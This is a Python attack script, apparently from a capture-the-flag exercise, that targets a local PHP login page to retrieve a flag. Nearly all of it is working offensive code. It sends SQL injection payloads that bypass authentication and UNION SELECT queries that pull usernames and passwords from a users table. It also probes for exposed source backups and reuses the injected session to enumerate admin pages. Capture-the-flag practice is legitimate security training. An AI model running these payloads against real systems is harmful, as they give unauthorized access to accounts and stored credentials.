import requests
import re

target = "http://127.0.0.1:32895/index.php"

print("[HYPOTHESIS] Maybe the application uses POST instead of GET, or checks specific values\n")

# Test POST method
print("[TEST 1] Try POST method with SQL injection")
print("-"*80)

post_payloads = [
    {"username": "admin'-- -", "password": "x"},
    {"username": "' OR 1=1-- -", "password": "x"},
    {"username": "' UNION SELECT 'admin','x',1-- -", "password": "x"},
]

for data in post_payloads:
    resp = requests.post(target, data=data)
    
    flag_match = re.search(r'FLAG\{[^}]+\}', resp.text)
    
    if flag_match:
        print(f"[!!! FLAG FOUND !!!]")
        print(f"Payload: {data}")
        print(f"Flag: {flag_match.group(0)}")
        print(f"\nFull Response:\n{resp.text}")
        exit(0)
    
    print(f"POST {data['username'][:30]:30s} | {'not admin' if 'not the admin' in resp.text.lower() else f'len={len(resp.text)}'}")

# Maybe the admin check is based on the actual database content
# Let's try to view the source or check for hints
print("\n[TEST 2] Look for PHP source code exposure")
print("-"*80)

source_attempts = [
    "http://127.0.0.1:32895/index.php.bak",
    "http://127.0.0.1:32895/index.php.txt",
    "http://127.0.0.1:32895/index.phps",
    "http://127.0.0.1:32895/.index.php.swp",
]

for url in source_attempts:
    resp = requests.get(url)
    if resp.status_code == 200 and len(resp.text) > 100:
        print(f"[!] Found: {url} ({len(resp.text)} bytes)")
        if 'FLAG{' in resp.text:
            flag_match = re.search(r'FLAG\{[^}]+\}', resp.text)
            print(f"[!!! FLAG IN SOURCE !!!]: {flag_match.group(0)}")
            print(resp.text)
            exit(0)
    else:
        print(f"[✗] {url} - {resp.status_code}")

# Let's try a completely different approach - maybe we need to find the actual admin username
print("\n[TEST 3] Try extracting database content with UNION SELECT")
print("-"*80)

# Extract usernames from the users table
extract_payloads = [
    "' UNION SELECT username,password,1 FROM users-- -",
    "' UNION SELECT CONCAT(username,':',password),1,1 FROM users-- -",
    "' UNION SELECT GROUP_CONCAT(username),1,1 FROM users-- -",
    "' UNION SELECT username,1,1 FROM users LIMIT 0,1-- -",
    "' UNION SELECT username,1,1 FROM users LIMIT 1,1-- -",
]

for payload in extract_payloads:
    params = {'username': payload, 'password': 'x'}
    resp = requests.get(target, params=params)
    
    flag_match = re.search(r'FLAG\{[^}]+\}', resp.text)
    
    if flag_match:
        print(f"[!!! FLAG FOUND !!!]")
        print(f"Payload: {payload}")
        print(f"Flag: {flag_match.group(0)}")
        print(f"\nFull Response:\n{resp.text}")
        exit(0)
    
    # Look for any extracted data in the HTML
    if len(resp.text) != 3173:  # Different from baseline
        print(f"[!] DIFFERENT RESPONSE LENGTH: {len(resp.text)} bytes")
        print(f"Payload: {payload}")
        print(f"Response preview:\n{resp.text[:500]}\n")
    else:
        print(f"[✗] {payload[:60]:60s} | standard response")

# Maybe the issue is that we're logged in but need to navigate to another page?
print("\n[TEST 4] Try authenticated paths after injection")
print("-"*80)

# First do the SQL injection, capture session
session = requests.Session()
resp = session.get(target, params={'username': "admin'-- -", 'password': 'x'})

# Now try to access common admin pages
admin_paths = [
    "/admin.php",
    "/admin/",
    "/dashboard.php",
    "/flag.php",
    "/admin/flag.php",
]

for path in admin_paths:
    url = f"http://127.0.0.1:32895{path}"
    resp = session.get(url)
    
    flag_match = re.search(r'FLAG\{[^}]+\}', resp.text)
    
    if flag_match:
        print(f"[!!! FLAG FOUND at {path} !!!]")
        print(f"Flag: {flag_match.group(0)}")
        print(f"\nFull Response:\n{resp.text}")
        exit(0)
    
    if resp.status_code == 200:
        print(f"[✓] {path:20s} exists ({len(resp.text)} bytes)")
    else:
        print(f"[✗] {path:20s} - {resp.status_code}")

print("\n[COMPLETE] No flag found")

